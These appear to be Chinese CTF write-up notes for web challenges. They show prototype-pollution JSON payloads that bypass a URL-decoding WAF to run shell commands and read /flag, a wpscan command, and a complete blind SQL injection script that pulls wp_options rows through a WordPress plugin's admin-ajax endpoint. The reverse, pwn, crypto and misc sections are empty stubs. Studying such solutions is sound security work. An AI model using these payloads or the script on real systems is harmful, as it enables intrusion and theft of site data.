https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd
# web
### realrce

审计代码,发现只要url解码失效waf就会return false,
```js
function waf(input_code) {
    bypasspin = /%[0-9a-fA-F]{2}/i;
    const bypasscode = bypasspin.test(input_code);
    if (bypasscode) {
        try {
            return waf(decodeURIComponent(input_code));
        } catch (error) {
            console.error("Error decoding input: ", error);
            //漏洞产生点
            return false;
        }
    }
    const blacklist = [/__proto__/i, /constructor/i, /prototype/i];
    for (const blackword of blacklist) {
        if (blackword.test(input_code)) {
            return true;
        }
    }
    return false;
}
```
原型链污染`cmd_rce`属性

非预期执行env获取flag
```json
{"msg":{"__proto__":{"cmd_rce":"ls"},"%ff":""}}
```
本来想着绕过xxd空格,正则还没看懂,结果发现已经绕过去了
```json
{"msg":{"__proto__":{"cmd_rce":"ls;xxd`cat /flag`/flag"},"%ff":""}}
```


### EzPenetration
wordpress的渗透

安装了wpscan,在wsl上

`wpscan --url http://node4.buuoj.cn:28657/`


发现存在sql注入漏洞
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231129015952.png)

```python
    #! /bin/python
    import requests
    def main():
            session = requests.Session()

            paramsGet = {"action":"rtec_send_unregister_link"}


            result = ''
            if 'wp_option' not in __import__('os').listdir('.'):
                    __import__('os').system('touch wp_option') # 用于记录wp_options表的内容

            with open('wp_option','r') as f: # 断点重连
                    result = f.read()[0:-1]
            i = len(result)
            while True:
                    i = i + 1
                    head = 30
                    tail = 130

                    while head < tail:
                            mid = (head + tail) >> 1
                            paramsPost = {"email":"r3tr0young@gmail.com","event_id":f"3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),{i},1)) from wp_options where option_id = 16)>{mid})-- "}
                            cookies = {"wordpress_test_cookie":"WP%20Cookie%20check"}
                            response = session.post("http://127.0.0.1:8080/wp-admin/admin-ajax.php", data=paramsPost, params=paramsGet, cookies=cookies)

                            if "success" in response.text:
                                    head = mid + 1
                            else:
                                    tail = mid

                    if head != 30:
                            result += chr(head)
                            print(result)
                            with open('wp_option','w') as f:
                                    f.write(result)
                    else:
                            break
        
    def restart():
            try:
                    main()
            except:
                    restart()

    if __name__ == '__main__':
                    try:
                            main()
                    except:
                            restart()
```


# reverse

### ezpython
#pyc
pyc逆向,直接使用会报错,010打开发现需要修改文件头,提示python3.11

```python

```

# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-26   05:13